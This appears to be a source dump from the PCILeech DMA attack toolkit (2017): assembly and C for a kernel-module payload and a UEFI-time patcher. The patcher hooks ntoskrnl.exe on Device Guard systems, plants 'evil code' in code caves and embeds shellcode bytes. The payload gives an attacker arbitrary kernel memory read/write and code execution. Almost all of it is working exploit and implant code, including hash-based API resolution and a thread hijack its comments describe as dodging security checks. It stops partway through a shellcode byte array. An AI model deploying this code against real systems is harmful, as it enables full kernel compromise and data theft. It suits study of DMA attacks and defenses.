.CODE

main PROC
	JMP main_setup
main ENDP

data_trigger_count	db 00h, 00h		; offset 0x02
addr_base_ntos		dd 00000000h	; offset 0x04
addr_this			dd 00000000h    ; offset 0x08
addr_sym0			dd 00000000h    ; offset 0x0c
addr_sym1			dd 00000000h    ; offset 0x10
addr_sym2			dd 00000000h    ; offset 0x14

main_setup PROC
	PUSH rax
	; ----------------------------------------------------
	; only continue of running at IRQL PASSIVE_LEVEL
	; ----------------------------------------------------
	MOV rax, cr8
	TEST al, al
	JNZ main_setup_exit
	; ----------------------------------------------------
	; save registers (14regs)
	; ----------------------------------------------------
	PUSH rbx
	PUSH rcx
	PUSH rdx
	PUSH rdi
	PUSH rsi
	PUSH r8
	PUSH r9
	PUSH r10
	PUSH r11
	PUSH r12
	PUSH r13
	PUSH r14
	PUSH r15
	PUSH rbp
	; ----------------------------------------------------
	; fetch ntos base, vfs addr, cr3, align stack, jump to c-code
	; ----------------------------------------------------
	LEA rcx, [main]
	MOV eax, [addr_this]
	SUB rcx, rax
	MOV eax, [addr_base_ntos]
	ADD rcx, rax
	LEA rdx, [main]
	MOV r8, cr3
	MOV r15, rsp
	SUB rsp, 100h
	SHR rsp, 4
	SHL rsp, 4
	CALL c_EntryPoint
	MOV rsp, r15
	; ----------------------------------------------------
	; restore registers
	; ----------------------------------------------------
	POP rbp
	POP r15
	POP r14
	POP r13
	POP r12
	POP r11
	POP r10
	POP r9
	POP r8
	POP rsi
	POP rdi
	POP rdx
	POP rcx
	POP rbx
	; ----------------------------------------------------
	; return
	; ----------------------------------------------------
	main_setup_exit:
	POP rax
	RET
main_setup ENDP

END

```

`pcileech_shellcode/uefi_winload_ntos_kmd_c.c`:

```c
// uefi_winload_ntos_kmd_c.c : special kmd for use in pre-patched ntoskrnl.exe with VBS enforced code integrity
//
// (planned to be used in demo at 34c3)
//
// (c) Ulf Frisk, 2017
// Author: Ulf Frisk, pcileech@frizk.net
//
// compile with:
// cl.exe /O1 /Os /Oy /FD /MT /GS- /J /GR- /FAcs /W4 /Zl /c /TC /kernel uefi_winload_ntos_kmd_c.c
// ml64.exe uefi_winload_ntos_kmd.asm /Feuefi_winload_ntos_kmd.exe /link /NODEFAULTLIB /RELEASE /MACHINE:X64 /entry:main uefi_winload_ntos_kmd_c.obj
// shellcode64.exe -o uefi_winload_ntos_kmd.exe
//
#include <windows.h>
#pragma warning( disable : 4047 4055 4127)

typedef unsigned __int64		QWORD, *PQWORD;
typedef __int64					PHYSICAL_ADDRESS, *PPHYSICAL_ADDRESS;

// ----------------------------- KERNEL DEFINES AND TYPEDEFS BELOW -----------------------------

typedef struct _CLIENT_ID {
	HANDLE UniqueProcess;
	HANDLE UniqueThread;
} CLIENT_ID;
typedef CLIENT_ID *PCLIENT_ID;

typedef _IRQL_requires_same_ _Function_class_(KSTART_ROUTINE) VOID KSTART_ROUTINE(
	_In_ PVOID StartContext
);
typedef KSTART_ROUTINE *PKSTART_ROUTINE;

typedef struct _UNICODE_STRING {
	USHORT Length;
	USHORT MaximumLength;
	_Field_size_bytes_part_(MaximumLength, Length) PWCH   Buffer;
} UNICODE_STRING;
typedef UNICODE_STRING *PUNICODE_STRING;

typedef struct _OBJECT_ATTRIBUTES {
	ULONG Length;
	HANDLE RootDirectory;
	PUNICODE_STRING ObjectName;
	ULONG Attributes;
	PVOID SecurityDescriptor;
	PVOID SecurityQualityOfService;
} OBJECT_ATTRIBUTES;
typedef OBJECT_ATTRIBUTES *POBJECT_ATTRIBUTES;
typedef CONST OBJECT_ATTRIBUTES *PCOBJECT_ATTRIBUTES;

typedef enum _MEMORY_CACHING_TYPE {
	MmNonCached = 0,
	MmCached = 1,
	MmWriteCombined = 2,
	MmHardwareCoherentCached = 3,
	MmNonCachedUnordered = 4,
	MmUSWCCached = 5,
	MmMaximumCacheType = 6
} MEMORY_CACHING_TYPE;

typedef struct _PHYSICAL_MEMORY_RANGE {
	PHYSICAL_ADDRESS BaseAddress;
	LARGE_INTEGER NumberOfBytes;
} PHYSICAL_MEMORY_RANGE, *PPHYSICAL_MEMORY_RANGE;

typedef enum _MODE {
	KernelMode,
	UserMode,
	MaximumMode
} MODE;

// ----------------------------- ROR13 HASHES BELOW -----------------------------

#define H_ExFreePool							0x9d489d1f
#define H_MmAllocateContiguousMemory			0x9f361ebc
#define H_MmFreeContiguousMemory				0x1345f592
#define H_MmGetPhysicalAddress					0x5a326357
#define H_MmGetPhysicalMemoryRanges				0x4977a56f
#define H_MmMapIoSpace							0x05ddbef9
#define H_MmUnmapIoSpace						0x6c6ec5c9
#define H_PsCreateSystemThread					0x94a06b02
#define H_RtlCopyMemory							0xcf64979b
#define H_RtlZeroMemory							0xc53d4fdb
#define H_ZwProtectVirtualMemory				0xbc3f4d89
#define H_KeDelayExecutionThread				0x58586d92
#define H_RtlZeroMemory							0xc53d4fdb

// ----------------------------- SHELLCODE DEFINES AND TYPEDEFS BELOW (STAGE2) -----------------------------

#undef RtlCopyMemory
#undef RtlZeroMemory
typedef struct tdNTOS {
	VOID(*ExFreePool)(
		_In_ PVOID P
		);
	VOID(*MmFreeContiguousMemory)(
		_In_ PVOID BaseAddress
		);
	PVOID(*MmAllocateContiguousMemory)(
		_In_ SIZE_T NumberOfBytes,
		_In_ PHYSICAL_ADDRESS HighestAcceptableAddress
		);
	PHYSICAL_ADDRESS(*MmGetPhysicalAddress)(
		_In_ PVOID BaseAddress
		);
	PPHYSICAL_MEMORY_RANGE(*MmGetPhysicalMemoryRanges)(
		VOID
		);
	PVOID(*MmMapIoSpace)(
		_In_  PHYSICAL_ADDRESS    PhysicalAddress,
		_In_  SIZE_T              NumberOfBytes,
		_In_  MEMORY_CACHING_TYPE CacheType
		);
	VOID(*MmUnmapIoSpace)(
		_In_  PVOID  BaseAddress,
		_In_  SIZE_T NumberOfBytes
		);
	NTSTATUS(*PsCreateSystemThread)(
		_Out_      PHANDLE            ThreadHandle,
		_In_       ULONG              DesiredAccess,
		_In_opt_   POBJECT_ATTRIBUTES ObjectAttributes,
		_In_opt_   HANDLE             ProcessHandle,
		_Out_opt_  PCLIENT_ID         ClientId,
		_In_       PKSTART_ROUTINE    StartRoutine,
		_In_opt_   PVOID              StartContext
		);
	VOID(*RtlCopyMemory)(
		_Out_       VOID UNALIGNED *Destination,
		_In_  const VOID UNALIGNED *Source,
		_In_        SIZE_T         Length
		);
	NTSTATUS(*ZwProtectVirtualMemory)(
		_In_ HANDLE ProcessHandle,
		_Inout_ PVOID *BaseAddress,
		_Inout_ PSIZE_T RegionSize,
		_In_ ULONG NewProtect,
		_Out_ PULONG OldProtect
		);
	NTSTATUS(*KeDelayExecutionThread)(
		_In_ MODE            WaitMode,
		_In_ BOOLEAN         Alertable,
		_In_ PINT64          pllInterval_Neg100ns
		);
	QWORD ReservedFutureUse[21];
} NTOS, *PNTOS;

#define KMDDATA_OPERATING_SYSTEM_WINDOWS		0x01
#define KMDDATA_MAGIC							0xff11337711333377

/*
* KMD DATA struct. This struct must be contained in a 4096 byte section (page).
* This page/struct is used to communicate between the inserted kernel code and
* the pcileech program.
* VNR: 003
*/
typedef struct tdKMDDATA {
	QWORD MAGIC;					// [0x000] magic number 0x0ff11337711333377.
	QWORD AddrKernelBase;			// [0x008] pre-filled by stage2, virtual address of kernel header (WINDOWS/MACOS).
	QWORD AddrKallsymsLookupName;	// [0x010] pre-filled by stage2, virtual address of kallsyms_lookup_name (LINUX).
	QWORD DMASizeBuffer;			// [0x018] size of DMA buffer.
	QWORD DMAAddrPhysical;			// [0x020] physical address of DMA buffer.
	QWORD DMAAddrVirtual;			// [0x028] virtual address of DMA buffer.
	QWORD _status;					// [0x030] status of operation
	QWORD _result;					// [0x038] result of operation TRUE|FALSE
	QWORD _address;					// [0x040] address to operate on.
	QWORD _size;					// [0x048] size of operation / data in DMA buffer.
	QWORD OperatingSystem;			// [0x050] operating system type
	QWORD ReservedKMD[8];			// [0x058] reserved for specific kmd data (dependant on KMD version).
	QWORD ReservedFutureUse1[13];	// [0x098] reserved for future use.
	QWORD dataInExtraLength;		// [0x100] length of extra in-data.
	QWORD dataInExtraOffset;		// [0x108] offset from DMAAddrPhysical/DMAAddrVirtual.
	QWORD dataInExtraLengthMax;		// [0x110] maximum length of extra in-data. 
	QWORD dataInConsoleBuffer;		// [0x118] physical address of 1-page console buffer.
	QWORD dataIn[28];				// [0x120]
	QWORD dataOutExtraLength;		// [0x200] length of extra out-data.
	QWORD dataOutExtraOffset;		// [0x208] offset from DMAAddrPhysical/DMAAddrVirtual.
	QWORD dataOutExtraLengthMax;	// [0x210] maximum length of extra out-data. 
	QWORD dataOutConsoleBuffer;		// [0x218] physical address of 1-page console buffer.
	QWORD dataOut[28];				// [0x220]
	NTOS fn;						// [0x300] used by shellcode to store function pointers.
	CHAR dataInStr[MAX_PATH];		// [0x400] string in-data
	CHAR ReservedFutureUse2[252];
	CHAR dataOutStr[MAX_PATH];		// [0x600] string out-data
	CHAR ReservedFutureUse3[252];
	QWORD ReservedFutureUse4[255];	// [0x800]
	QWORD _op;						// [0xFF8] (op is last 8 bytes in 4k-page)
} KMDDATA, *PKMDDATA;

// ----------------------------- SHELLCODE FUNCTIONS BELOW (STAGE2) -----------------------------

DWORD HashROR13A(_In_ LPCSTR sz)
{
	DWORD dwVal, dwHash = 0;
	while(*sz) {
		dwVal = (DWORD)*sz++;
		dwHash = (dwHash >> 13) | (dwHash << 19);
		dwHash += dwVal;
	}
	return dwHash;
}

/*
* Lookup a function and return it, if found.
* -- hModule
* -- dwProcNameH
* -- return
*/
QWORD PEGetProcAddressH(_In_ QWORD hModule, _In_ DWORD dwProcNameH)
{
	PDWORD pdwRVAAddrNames, pdwRVAAddrFunctions;
	PWORD pwNameOrdinals;
	DWORD i, dwFnIdx, dwHash;
	LPSTR sz;
	PIMAGE_DOS_HEADER dosHeader = (PIMAGE_DOS_HEADER)hModule; // dos header.
	PIMAGE_NT_HEADERS ntHeader = (PIMAGE_NT_HEADERS)(hModule + dosHeader->e_lfanew); // nt header
	PIMAGE_EXPORT_DIRECTORY exp = (PIMAGE_EXPORT_DIRECTORY)(ntHeader->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT].VirtualAddress + hModule);
	pdwRVAAddrNames = (PDWORD)(hModule + exp->AddressOfNames);
	pwNameOrdinals = (PWORD)(hModule + exp->AddressOfNameOrdinals);
	pdwRVAAddrFunctions = (PDWORD)(hModule + exp->AddressOfFunctions);
	for(i = 0; i < exp->NumberOfNames; i++) {
		sz = (LPSTR)(hModule + pdwRVAAddrNames[i]);
		dwHash = HashROR13A(sz);
		if(dwHash == dwProcNameH) {
			dwFnIdx = pwNameOrdinals[i];
			if(dwFnIdx >= exp->NumberOfFunctions) { return 0; }
			return hModule + pdwRVAAddrFunctions[dwFnIdx];
		}
	}
	return 0;
}

#define KMD_CMD_VOID			0xffff
#define KMD_CMD_COMPLETED		0
#define KMD_CMD_READ			1
#define KMD_CMD_WRITE			2
#define KMD_CMD_TERMINATE		3
#define KMD_CMD_MEM_INFO		4
#define KMD_CMD_EXEC		    5
#define KMD_CMD_READ_VA			6
#define KMD_CMD_WRITE_VA		7
#define KMD_CMD_EXEC_EXTENDED	8

// status:
//     1: ready for command
//     2: processing
//     f0000000: terminated
//     f0000000+: error
// op: - see KMD_CMD defines
// result:
//    0: FALSE
//    1: TRUE
// address:
//    physical base address for memory operation
// size:
//    size of memory operation
VOID stage3_c_MainCommandLoop(PKMDDATA pk)
{
	LONGLONG llTimeToWait = -10000; // 1000 uS (negative multiples of 100ns)
	PVOID pvBufferOutDMA;
	PPHYSICAL_MEMORY_RANGE pMemMap;
	PVOID pvMM = NULL;
	QWORD i, idleCount = 0;
	// 1: set up mem out dma area 16MB//4MB in lower 4GB
	pk->DMASizeBuffer = 0x1000000;
	pvBufferOutDMA = pk->fn.MmAllocateContiguousMemory(0x01000000, 0xffffffff);
	if(!pvBufferOutDMA) {
		pk->DMASizeBuffer = 0x00400000;
		pvBufferOutDMA = pk->fn.MmAllocateContiguousMemory(0x00400000, 0xffffffff);
	}
	if(!pvBufferOutDMA) {
		pk->DMASizeBuffer = 0;
		pk->_status = 0xf0000001;
		return;
	}
	pk->DMAAddrVirtual = (QWORD)pvBufferOutDMA;
	pk->DMAAddrPhysical = pk->fn.MmGetPhysicalAddress(pvBufferOutDMA);
	// 2: main dump loop
	while(TRUE) {
		pk->_status = 1;
		if(KMD_CMD_COMPLETED == pk->_op) { // NOP
			idleCount++;
			// thread wait after X number of idle loops - TODO: change to timing
			if(idleCount > 10000000000) {
				pk->fn.KeDelayExecutionThread(KernelMode, FALSE, &llTimeToWait);
			}
			continue;
		}
		pk->_status = 2;
		if(KMD_CMD_TERMINATE == pk->_op) { // EXIT
			pk->_status = 0xf0000000;
			pk->fn.MmFreeContiguousMemory(pvBufferOutDMA);
			pk->DMAAddrPhysical = 0;
			pk->DMAAddrVirtual = 0;
			pk->_result = TRUE;
			pk->MAGIC = 0;
			pk->_op = KMD_CMD_COMPLETED;
			return;
		}
		if(KMD_CMD_MEM_INFO == pk->_op) { // INFO (physical section map)
			pMemMap = pk->fn.MmGetPhysicalMemoryRanges();
			if(pMemMap == NULL) {
				pk->_result = FALSE;
			} else {
				for(i = 0; (pMemMap[i].BaseAddress) || (pMemMap[i].NumberOfBytes.QuadPart); i++);
				pk->_size = i * sizeof(PHYSICAL_MEMORY_RANGE);
				pk->fn.RtlCopyMemory(pvBufferOutDMA, pMemMap, pk->_size);
				pk->fn.ExFreePool(pMemMap);
				pk->_result = TRUE;
			}
		}
		if(KMD_CMD_EXEC == pk->_op) { // EXEC at start of buffer
			if(pk->dataIn[9]) {
				// PSCMD_KERNEL
				((VOID(*)(PKMDDATA))pk->ReservedKMD[1])(pk);
				pk->_result = TRUE;
			} else {
				// VFS
				((VOID(*)(PKMDDATA))pk->ReservedKMD[0])(pk);
				pk->_result = TRUE;
			}
		}
		if(KMD_CMD_READ == pk->_op || KMD_CMD_WRITE == pk->_op) { // PHYSICAL MEMORY READ/WRITE
			if(pk->dataIn[9] == 0) {
				pvMM = NULL; // no memory read if vfs (might crash the system accidentally)
			} else {
				pvMM = pk->fn.MmMapIoSpace(pk->_address, pk->_size, 0);
			}
			if(pvMM) {
				if(KMD_CMD_READ == pk->_op) { // READ
					pk->fn.RtlCopyMemory(pvBufferOutDMA, pvMM, pk->_size);
				} else { // WRITE
					pk->fn.RtlCopyMemory(pvMM, pvBufferOutDMA, pk->_size);
				}
				pk->fn.MmUnmapIoSpace(pvMM, pk->_size);
				pk->_result = TRUE;
			} else {
				pk->_result = FALSE;
			}
		}
		if(KMD_CMD_READ_VA == pk->_op) { // READ Virtual Address
			pk->fn.RtlCopyMemory(pvBufferOutDMA, (PVOID)pk->_address, pk->_size);
			pk->_result = TRUE;
		}
		if(KMD_CMD_WRITE_VA == pk->_op) { // WRITE Virtual Address
			pk->fn.RtlCopyMemory((PVOID)pk->_address, pvBufferOutDMA, pk->_size);
			pk->_result = TRUE;
		}
		pk->_op = KMD_CMD_COMPLETED;
		idleCount = 0;
	}
}

#define DATA_OFFSET_TRIGGER_COUNT	0x02
#define DATA_OFFSET_KMD_THIS		0x08
#define DATA_OFFSET_VFS				0x0c
#define DATA_OFFSET_PSCMD_KERNEL	0x10
#define DATA_OFFSET_PSCMD_USER		0x14
VOID c_EntryPoint_Thread(QWORD qwAddrNtosBase, QWORD qwAddrKmdBase)
{
	PVOID(*MmMapIoSpace)(PHYSICAL_ADDRESS, SIZE_T, MEMORY_CACHING_TYPE);
	VOID(*MmUnmapIoSpace)(PVOID, SIZE_T);
	PVOID(*MmAllocateContiguousMemory)(SIZE_T, PHYSICAL_ADDRESS);
	PHYSICAL_ADDRESS(*MmGetPhysicalAddress)(PVOID);
	VOID(*RtlZeroMemory)(PVOID, SIZE_T);
	PVOID pvKMD, pvPA1000;
	PKMDDATA pk;
	DWORD i = 0, NAMES[32];
	QWORD vaAddrZero;
	MmMapIoSpace = (PVOID(*)(PHYSICAL_ADDRESS, SIZE_T, MEMORY_CACHING_TYPE))PEGetProcAddressH(qwAddrNtosBase, H_MmMapIoSpace);
	MmUnmapIoSpace = (VOID(*)(PVOID, SIZE_T))PEGetProcAddressH(qwAddrNtosBase, H_MmUnmapIoSpace);
	MmAllocateContiguousMemory = (PVOID(*)(SIZE_T, PHYSICAL_ADDRESS))PEGetProcAddressH(qwAddrNtosBase, H_MmAllocateContiguousMemory);
	MmGetPhysicalAddress = (PHYSICAL_ADDRESS(*)(PVOID))PEGetProcAddressH(qwAddrNtosBase, H_MmGetPhysicalAddress);
	RtlZeroMemory = (VOID(*)(PVOID, SIZE_T))PEGetProcAddressH(qwAddrNtosBase, H_RtlZeroMemory);
	pvKMD = MmMapIoSpace(0x3000, 0x1000, 0);
	if(!pvKMD) { return; }
	RtlZeroMemory(pvKMD, 0x1000);
	pk = (PKMDDATA)pvKMD;
	pk->AddrKernelBase = qwAddrNtosBase;
	pk->MAGIC = 0x0ff11337711333377;
	pk->OperatingSystem = KMDDATA_OPERATING_SYSTEM_WINDOWS;
	vaAddrZero = qwAddrKmdBase - *(PDWORD)(qwAddrKmdBase + DATA_OFFSET_KMD_THIS);
	pk->ReservedKMD[0] = vaAddrZero + *(PDWORD)(qwAddrKmdBase + DATA_OFFSET_VFS);
	pk->ReservedKMD[1] = vaAddrZero + *(PDWORD)(qwAddrKmdBase + DATA_OFFSET_PSCMD_KERNEL);
	pk->ReservedKMD[2] = vaAddrZero + *(PDWORD)(qwAddrKmdBase + DATA_OFFSET_PSCMD_USER);
	NAMES[i++] = H_ExFreePool;
	NAMES[i++] = H_MmFreeContiguousMemory;
	NAMES[i++] = H_MmAllocateContiguousMemory;
	NAMES[i++] = H_MmGetPhysicalAddress;
	NAMES[i++] = H_MmGetPhysicalMemoryRanges;
	NAMES[i++] = H_MmMapIoSpace;
	NAMES[i++] = H_MmUnmapIoSpace;
	NAMES[i++] = H_PsCreateSystemThread;
	NAMES[i++] = H_RtlCopyMemory;
	NAMES[i++] = H_ZwProtectVirtualMemory;
	NAMES[i++] = H_KeDelayExecutionThread;
	while(i) {
		i--;
		*((PQWORD)&pk->fn + i) = PEGetProcAddressH(pk->AddrKernelBase, NAMES[i]);
	}
	pvPA1000 = MmMapIoSpace(0x1000, 0x1000, 0);
	*(PQWORD)((QWORD)pvPA1000 + 0xc0) = MmGetPhysicalAddress(pvKMD);
	*(PQWORD)((QWORD)pvPA1000 + 0xb0) = KMDDATA_MAGIC;
	MmUnmapIoSpace(pvPA1000, 0x1000);
	stage3_c_MainCommandLoop(pk);
}

VOID c_EntryPoint(QWORD qwAddrNtosBase, QWORD qwAddrKmdBase, QWORD qwCR3)
{
	PVOID(*MmMapIoSpace)(PHYSICAL_ADDRESS, SIZE_T, MEMORY_CACHING_TYPE);
	VOID(*MmUnmapIoSpace)(PVOID, SIZE_T);
	PVOID pvPA1000;
	QWORD count;
	WORD cTrigger;
	MmMapIoSpace = (PVOID(*)(PHYSICAL_ADDRESS, SIZE_T, MEMORY_CACHING_TYPE))PEGetProcAddressH(qwAddrNtosBase, H_MmMapIoSpace);
	MmUnmapIoSpace = (VOID(*)(PVOID, SIZE_T))PEGetProcAddressH(qwAddrNtosBase, H_MmUnmapIoSpace);
	pvPA1000 = MmMapIoSpace(0x1000, 0x1000, 0);
	if(!pvPA1000) { return; }
	if((*(PQWORD)((QWORD)pvPA1000 + 0xa0) == qwCR3)) {
		cTrigger = *(PWORD)(qwAddrKmdBase + DATA_OFFSET_TRIGGER_COUNT);
		count = *(PQWORD)((QWORD)pvPA1000 + 0xb8) = *(PQWORD)((QWORD)pvPA1000 + 0xb8) + 1;
		if(count == cTrigger) {
			MmUnmapIoSpace(pvPA1000, 0x1000);
			//INFO: it seems like we cannot create system thread due to security checks
			//PsCreateSystemThread = (NTSTATUS(*)(PHANDLE, ULONG, POBJECT_ATTRIBUTES, HANDLE, PCLIENT_ID, PKSTART_ROUTINE, PVOID))PEGetProcAddressH(qwAddrNtosBase, H_PsCreateSystemThread);
			//PsCreateSystemThread(&hThread, 0x1ffff, NULL, NULL, NULL, (PKSTART_ROUTINE)c_EntryPoint_Thread, (PVOID)qwAddrNtosBase);
			//INFO: hijack is fine with 'security' though =P			
			c_EntryPoint_Thread(qwAddrNtosBase, qwAddrKmdBase);
			return;
		}
	}
	MmUnmapIoSpace(pvPA1000, 0x1000);
}

```

`pcileech_shellcode/uefi_winload_ntos_patch.c`:

```c
// uefi_winload_ntos_patch.c : hooks/patches ntoskrnl.exe!PsCreateSystemThreadEx with evil code.
// evil code consists of:
// - custom kernel module
// - mount (vfs) payload (use with 'pcileech mount')
// - pscmd payload (use with 'pcileech wx64_pscmd -9 1')
//
// (planned to be used in demo at 34c3)
//
// (c) Ulf Frisk, 2017
// Author: Ulf Frisk, pcileech@frizk.net
//
// compile with:
// cl.exe /O1 /Os /Oy /FD /MT /GS- /J /GR- /FAcs /W4 /Zl /c /TC /kernel uefi_common.c
// cl.exe /O1 /Os /Oy /FD /MT /GS- /J /GR- /FAcs /W4 /Zl /c /TC /kernel uefi_winload_ntos_patch.c
// ml64.exe uefi_common_a.asm /Feuefi_winload_ntos_patch.exe /link /NODEFAULTLIB /RELEASE /MACHINE:X64 /entry:main uefi_winload_ntos_patch.obj uefi_common.obj
// shellcode64.exe -o uefi_winload_ntos_patch.exe "UEFI WINLOAD NTOSKRNL.EXE PATCHER FOR DEVICE GUARD SYSTEMS\n===========================================================\nPatches ntoskrnl.exe!PsCreateSystemThread with executable set separately with\nthe in parameter. Must be run from ExitBootServices. Targets Windows 10 with\nDevice Guard only! Good value for num_threads_skip is 0x50.\nSyntax: pcileech.exe uefi_winload_ntos_patch -in <patchfile> -0 <num_threads_skip>\nGENERAL INFORMATION BELOW:%s\n  Status           : %016llx\n  NTOSKRNL.EXE     : %016llx\n  Hooked Function  : %016llx\n  Code Cave VFS    : %016llx\n  Code Cave KMD    : %016llx\n  Code Cave CMD #1 : %016llx\n  Code Cave CMD #2 : %016llx\n"
//
#include "uefi_common.h"

// ----------------------------------------------------------------------------
// UTILITY FUNCTIONS BELOW:
// ----------------------------------------------------------------------------

/*
* Calculate a ROR13 hash given an ANSI string.
* -- sz
* -- return
*/
DWORD HashROR13A(LPSTR sz)
{
	DWORD dwVal, dwHash = 0;
	while(*sz) {
		dwVal = (DWORD)*sz++;
		dwHash = (dwHash >> 13) | (dwHash << 19);
		dwHash += dwVal;
	}
	return dwHash;
}

/*
* Lookup address of function given a module base address and a ROR13 hash.
* -- hModule = base address of PE to look for function in.
* -- dwProcNameH = ROR13 hash of function name to lookup.
* -- return = address of function, 0 = fail.
*/
QWORD PEGetProcAddressH(QWORD hModule, DWORD dwProcNameH)
{
	PDWORD pdwRVAAddrNames, pdwRVAAddrFunctions;
	PWORD pwNameOrdinals;
	DWORD i, dwFnIdx, dwHash;
	LPSTR sz;
	PIMAGE_DOS_HEADER dosHeader = (PIMAGE_DOS_HEADER)hModule; // dos header.
	if(!dosHeader || dosHeader->e_magic != IMAGE_DOS_SIGNATURE) { return 0; }
	PIMAGE_NT_HEADERS ntHeader = (PIMAGE_NT_HEADERS)(hModule + dosHeader->e_lfanew); // nt header
	if(!ntHeader || ntHeader->Signature != IMAGE_NT_SIGNATURE) { return 0; }
	PIMAGE_EXPORT_DIRECTORY exp = (PIMAGE_EXPORT_DIRECTORY)(ntHeader->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT].VirtualAddress + hModule);
	if(!exp || !exp->NumberOfNames || !exp->AddressOfNames) { return 0; }
	pdwRVAAddrNames = (PDWORD)(hModule + exp->AddressOfNames);
	pwNameOrdinals = (PWORD)(hModule + exp->AddressOfNameOrdinals);
	pdwRVAAddrFunctions = (PDWORD)(hModule + exp->AddressOfFunctions);
	for(i = 0; i < exp->NumberOfNames; i++) {
		sz = (LPSTR)(hModule + pdwRVAAddrNames[i]);
		dwHash = HashROR13A(sz);
		if(dwHash == dwProcNameH) {
			dwFnIdx = pwNameOrdinals[i];
			if(dwFnIdx >= exp->NumberOfFunctions) { return 0; }
			return (QWORD)(hModule + pdwRVAAddrFunctions[dwFnIdx]);
		}
	}
	return 0;
}

BOOL PEGetSection(QWORD hModule, QWORD qwSzSection, PDWORD pdwSectionBaseRel, PDWORD pdwSectionSize)
{
	PIMAGE_DOS_HEADER dosHeader = (PIMAGE_DOS_HEADER)hModule; // dos header.
	if(!dosHeader || dosHeader->e_magic != IMAGE_DOS_SIGNATURE) { return FALSE; }
	PIMAGE_NT_HEADERS ntHeader = (PIMAGE_NT_HEADERS)(hModule + dosHeader->e_lfanew); // nt header
	if(!ntHeader || ntHeader->Signature != IMAGE_NT_SIGNATURE) { return FALSE; }
	int nSections = ntHeader->FileHeader.NumberOfSections;
	for(int i = 0; i < nSections; i++) {
		PIMAGE_SECTION_HEADER sectionHeader = (PIMAGE_SECTION_HEADER)(hModule + dosHeader->e_lfanew + sizeof(IMAGE_NT_HEADERS64) + i * sizeof(IMAGE_SECTION_HEADER));
		if(*(PQWORD)sectionHeader->Name == qwSzSection) {
			*pdwSectionBaseRel = sectionHeader->VirtualAddress;
			*pdwSectionSize = sectionHeader->Misc.VirtualSize;
			return TRUE;
		}
	}
	return FALSE;
}

// ----------------------------------------------------------------------------
// "SPECIALIZED" UTILITY FUNCTIONS BELOW:
// ----------------------------------------------------------------------------

/*
* When ExitBootServices() is called by winload.efi ntoskrnl.exe (and hvix.exe)
* are already loaded and integrity checked by winload. The location of ntoskrnl
* is randomized in memory, but is usually found between address: 0x01000000 and
* 0x04000000.
* -- return = base address of ntoskrnl.exe, 0 if fail.
*/
QWORD FindNtoskrnl()
{
	QWORD qwA, o;
	BOOL fINITKDBG, fPOOLCODE;
	for(qwA = 0x01000000; qwA < 0x04000000; qwA += 0x1000) {
		if(*(PWORD)qwA == 0x5a4d) { // MZ header
			fINITKDBG = FALSE;
			fPOOLCODE = FALSE;
			for(o = 0; o < 0x1000; o += 8) {
				if(*(PQWORD)(qwA + o) == 0x4742444B54494E49) { // INITKDBG
					fINITKDBG = TRUE;
				}
				if(*(PQWORD)(qwA + o) == 0x45444F434C4F4F50) { // POOLCODE
					fPOOLCODE = TRUE;
				}
				if(fINITKDBG && fPOOLCODE) {
					return qwA;
				}
			}
		}
	}
	return 0;
}

/*
* Locate a "code cave" - a place (in an executable section) consisting of zeros
* in which we can put our main executable payload. Function searches forward
* given a base address to find such a region of max qwSize bytes. Function is
* dumb and in rare cases code cave returned might be in NX section.
* -- hModule = base address to start searching from.
* -- qwSize = size of code cave to locate; max 0x1000 and even QWORD required.
* -- return = address of located code cave, 0 if fail.
*/
QWORD FindCodeCave(QWORD hModule, QWORD qwSize)
{
	QWORD STR_SECTIONS_ALLOWED[] = {
		0x000000747865742e,	// .text
		0x0000000045474150,	// PAGE
		0x45444f434c4f4f50,	// POOLCODE
		0x00004b4c45474150,	// PAGELK
		0x0000444b45474150,	// PAGEKD
		0x534c444845474150	// PAGEHDLS
	};
	DWORD i, dwSectionBaseRel, dwSectionSize;
	QWORD qwACC;
	for(i = 0; i < sizeof(STR_SECTIONS_ALLOWED) / sizeof(QWORD); i++) {
		if(!PEGetSection(hModule, STR_SECTIONS_ALLOWED[i], &dwSectionBaseRel, &dwSectionSize)) { continue; } // section not found
		if(qwSize > (0x1000 - (dwSectionSize & 0xfff))) { continue; } // code cave too small
		qwACC = hModule + dwSectionBaseRel + dwSectionSize;
		if(*(PQWORD)qwACC) { continue; } // not empty - code cave probably already taken ...
		return qwACC;
	}
	return 0;
}

// ----------------------------------------------------------------------------
// SHELLCODE MODULES (COMPILED SEPARATELY) BELOW:
// ----------------------------------------------------------------------------

// specially compiled kernel module payload, compile and extract shellcode with:
//
// cl.exe /O1 /Os /Oy /FD /MT /GS- /J /GR- /FAcs /W4 /Zl /c /TC /kernel uefi_winload_ntos_kmd_c.c
// ml64.exe uefi_winload_ntos_kmd.asm /Feuefi_winload_ntos_kmd.exe /link /NODEFAULTLIB /RELEASE /MACHINE:X64 /entry:main uefi_winload_ntos_kmd_c.obj
// shellcode64.exe -o uefi_winload_ntos_kmd.exe
// xxd -i uefi_winload_ntos_kmd.bin
VOID GetData_KMD(PBYTE *ppb, PDWORD pcb)
{
	BYTE WINX64_KMD_BIN[] = {
		0xeb, 0x16, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
		0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
		0x50, 0x44, 0x0f, 0x20, 0xc0, 0x84, 0xc0, 0x75, 0x6a, 0x53, 0x51, 0x52,
		0x57, 0x56, 0x41, 0x50, 0x41, 0x51, 0x41, 0x52, 0x41, 0x53, 0x41, 0x54,
		0x41, 0x55, 0x41, 0x56, 0x41, 0x57, 0x55, 0x48, 0x8d, 0x0d, 0xc2, 0xff,
		0xff, 0xff, 0x8b, 0x05, 0xc4, 0xff, 0xff, 0xff, 0x48, 0x2b, 0xc8, 0x8b,
		0x05, 0xb7, 0xff, 0xff, 0xff, 0x48, 0x03, 0xc8, 0x48, 0x8d, 0x15, 0xa9,
		0xff, 0xff, 0xff, 0x41, 0x0f, 0x20, 0xd8, 0x4c, 0x8b, 0xfc, 0x48, 0x81,
		0xec, 0x00, 0x01, 0x00, 0x00, 0x48, 0xc1, 0xec, 0x04, 0x48, 0xc1, 0xe4,
		0x04, 0xe8, 0xba, 0x00, 0x00, 0x00, 0x49, 0x8b, 0xe7, 0x5d, 0x41, 0x5f,
		0x41, 0x5e, 0x41, 0x5d, 0x41, 0x5c, 0x41, 0x5b, 0x41, 0x5a, 0x41, 0x59,
